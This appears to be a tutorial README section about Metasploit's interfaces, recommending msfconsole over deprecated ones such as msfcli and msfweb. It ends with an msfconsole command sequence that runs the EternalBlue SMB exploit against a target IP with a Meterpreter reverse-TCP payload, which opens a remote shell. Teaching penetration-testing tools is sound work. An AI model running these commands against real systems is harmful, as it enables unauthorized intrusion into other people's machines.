## Metasploit Interfaces

Metasploit provides multiple interfaces to accommodate different workflows, skill levels, and use cases. Each interface offers access to the framework’s core capabilities—exploitation, scanning, and payload delivery—but varies in terms of flexibility and user experience.

### Available Interfaces

1. **msfconsole** – The most powerful and widely-used interface.  
   It provides an interactive command-line environment with support for tab-completion, built-in help, and deep module interaction. This will be our primary focus throughout this repository.

2. **msfcli** – A legacy command-line interface designed for single-command usage.  
   *Note:* `msfcli` is deprecated and no longer included in recent versions of Metasploit.

3. **Armitage** – A GUI-based third-party interface built on top of Metasploit.  
   It visualizes targets and sessions, but has fallen out of favor and is largely considered outdated.

4. **msfweb** – A browser-based interface, once used for remote exploitation management.  
   This interface is no longer maintained and is considered deprecated in modern deployments.

### Why Use `msfconsole`

Among all interfaces, **`msfconsole` is the most robust, up-to-date, and actively supported**. It allows you to:

- Load and configure modules easily.
- Generate and handle payloads.
- Perform exploit automation.
- Integrate with external tools and databases.
- Manage sessions, jobs, and services—all in one shell.

You'll find yourself using commands like:

```bash
msfconsole
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
